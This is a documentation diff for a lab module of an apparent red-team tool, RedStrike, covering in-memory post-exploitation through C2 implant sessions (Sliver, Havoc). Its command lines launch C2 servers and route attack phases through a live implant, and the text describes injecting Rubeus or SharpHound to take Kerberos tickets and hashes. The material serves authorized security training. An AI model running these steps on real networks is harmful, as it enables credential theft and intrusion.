@@ -186,19 +186,22 @@ Add to `.vscode/mcp.json` in your workspace root:
 ### Lab Module 4: In-Memory C2 Post-Exploitation via C2Stack
 **Objective**: Execute post-exploitation tools inside an active implant session without dropping binaries to disk.
 
-1. Launch C2Stack (Sliver or Meridian):
+1. Launch C2Stack (any of its five frameworks):
    ```bash
    # From C2Stack repository
-   docker compose up -d sliver meridian
+   cd Docker && ./docker-bootstrap.ps1 -All   # or ./docker-bootstrap.sh --all
    ```
 2. Run graph in C2-Enabled Mode:
    ```bash
    # Run campaign through an active Sliver session
    redstrike graph run --phase 1-3 --c2 --c2-backend sliver --c2-session <session-id>
+
+   # Or through Havoc/Adaptix via C2Stack's Flight Control portal (port 8000)
+   redstrike graph run --phase 1-3 --c2 --c2-backend havoc --c2-endpoint http://127.0.0.1:8000
    ```
 3. **What RedStrike Executes**:
    - Constructs a `CallSpec(kind="c2", c2_backend="sliver", c2_task_type="execute_assembly")`.
-   - Sliver injects `Rubeus.exe` or `SharpHound.exe` into remote process memory via CLR hosting.
+   - Sliver injects `Rubeus.exe` or `SharpHound.exe` into remote process memory via CLR hosting (on Havoc the same CallSpec tasks the framework-native `dotnet` command through the Flight Control portal).
    - Extracts Kerberos ticket / hash evidence and updates the local `CredentialLedger`.
 
 ---
